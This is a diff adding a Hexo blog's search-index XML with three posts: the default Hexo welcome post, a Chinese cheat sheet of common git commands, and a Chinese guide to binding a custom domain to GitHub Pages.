+      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Git常用指令]]></title>
+      <url>https://lostlover.github.io/20160731/git-directives.html</url>
+      <content type="html"><![CDATA[<blockquote>
+<p>1.在本地目录下关联远程repository ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github.com:git_username/repository_name.git</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>2.取消本地目录下关联的远程库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote remove origin</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<hr>
+<a id="more"></a>
+<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><blockquote>
+<p>远程仓库相关命令</p>
+</blockquote>
+<ul>
+<li>检出仓库：<code>$ git clone git://github.com/jquery/jquery.git</code></li>
+<li>查看远程仓库：<code>$ git remote -v</code></li>
+<li>添加远程仓库：<code>$ git remote add [name] [url]</code></li>
+<li>删除远程仓库：<code>$ git remote rm [name]</code></li>
+<li>修改远程仓库：<code>$ git remote set-url --push [name] [newUrl]</code></li>
+<li>拉取远程仓库：<code>$ git pull [remoteName] [localBranchName]</code></li>
+<li>推送远程仓库：<code>$ git push [remoteName] [localBranchName]</code></li>
+</ul>
+<blockquote>
+<p>分支(branch)操作相关命令</p>
+</blockquote>
+<ul>
+<li>查看远程分支：<code>$ git branch -r</code></li>
+<li>创建本地分支：<code>$ git branch [name] //注意新分支创建后不会自动切换为当前分支</code></li>
+<li>切换分支：<code>$ git checkout [name]</code></li>
+<li>创建新分支并立即切换到新分支：<code>$ git checkout -b [name]</code></li>
+<li>删除分支：<code>$ git branch -d [name] //d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</code></li>
+<li>合并分支：<code>$ git merge [name] //将名称为[name]的分支与当前分支合并</code></li>
+<li>创建远程分支(本地分支push到远程)：<code>$ git push origin [name]</code></li>
+<li>删除远程分支：<code>$ git push origin :heads/[name] 或 $ gitpush origin :[name]</code></li>
+</ul>
+<blockquote>
+<p>版本(tag)操作相关命令</p>
+</blockquote>
+<ul>
+<li>查看版本：<code>$ git tag</code></li>
+<li>创建版本：<code>$ git tag [name]</code></li>
+<li>删除版本：<code>$ git tag -d [name]</code></li>
+<li>查看远程版本：<code>$ git tag -r</code></li>
+<li>创建远程版本(本地版本push到远程)：<code>$ git push origin [name]</code></li>
+<li>删除远程版本：<code>$ git push origin :refs/tags/[name]</code></li>
+<li>合并远程仓库的tag到本地：<code>$ git pull origin --tags</code></li>
+<li>上传本地tag到远程仓库：<code>$ git push origin --tags</code></li>
+<li>创建带注释的tag：<code>$ git tag -a [name] -m &#39;yourMessage&#39;</code></li>
+</ul>
+<blockquote>
+<p>子模块(submodule)相关操作命令</p>
+</blockquote>
+<ul>
+<li>添加子模块：<code>$ git submodule add [url] [path]</code></li>
+<li>初始化子模块：<code>$ git submodule init  //只在首次检出仓库时运行一次就行</code></li>
+<li>更新子模块：<code>$ git submodule update  //每次更新或切换分支后都需要运行一下</code></li>
+<li>删除子模块：（分4步走哦）<ul>
+<li>1) <code>$ git rm --cached [path]</code></li>
+<li>2) 编辑“.gitmodules”文件，将子模块的相关配置节点删除掉</li>
+<li>3) 编辑“ .git/config”文件，将子模块的相关配置节点删除掉</li>
+<li>4) 手动删除子模块残留的目录</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>Git 常用命令图表 </p>
+</blockquote>
+<p><img src="/downloads/2010072023345292.png" alt="常用命令图表"></p>
+<blockquote>
+<p>参考文档：<br><a href="http://blog.csdn.net/dengsilinming/article/details/8000573" target="_blank" rel="noopener">Git 命令参数及用法详解</a><br><a href="http://gitref.org/index.html" target="_blank" rel="noopener">GitRef</a></p>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> version control </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> git </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Github绑定自定义域名(附hexo配置)]]></title>
+      <url>https://lostlover.github.io/20160731/github-customdomain.html</url>
+      <content type="html"><![CDATA[<h2 id="如何绑定自定义域名"><a href="#如何绑定自定义域名" class="headerlink" title="如何绑定自定义域名"></a>如何绑定自定义域名</h2><h3 id="1-添加CNAME"><a href="#1-添加CNAME" class="headerlink" title="1.添加CNAME"></a>1.添加CNAME</h3><p>在你的<code>github_name.github.io</code>项目根目录下创建一个<code>CNAME</code>文件(无扩展名)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//你要绑定的域名</span><br><span class="line">178dream.com</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h3 id="2-解析域名"><a href="#2-解析域名" class="headerlink" title="2.解析域名"></a>2.解析域名</h3><p>去你购买域名的服务商空间里找到域名解析的选项,修改如下:<br><img src="/downloads/Achange.png" alt="A记录修改"><br>解析成功后即可用绑定的自定义访问.</p>
+<hr>
+<h2 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h2><p>如果使用hexo部署博客的话,CNAME文件写在以下路径:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/source/CNAME</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g // 在public根目录下生成CNAME文件</span><br><span class="line">$ hexo d // 自动部署到远程仓库根目录下</span><br></pre></td></tr></table></figure>]]></content>
+      
+        
+        <tags>
+            
+            <tag> github </tag>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+        
+    </entry>
+    
+  
+  
+</search>
